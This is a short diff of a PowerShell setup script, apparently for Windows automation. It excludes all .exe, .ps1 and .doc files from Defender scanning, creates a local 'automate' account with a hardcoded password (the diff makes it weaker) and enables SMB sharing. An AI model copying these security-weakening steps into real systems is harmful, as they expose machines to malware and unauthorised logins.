@@ -11,7 +11,7 @@ Add-MpPreference -ExclusionExtension ".exe"
 Add-MpPreference -ExclusionExtension ".ps1"
 Add-MpPreference -ExclusionExtension ".doc"
 
-net user automate Automate123456! /add
+net user automate A123456! /add
 
 # Habilite o serviço SMB
 Set-Service -Name "LanmanServer" -StartupType 'Automatic'
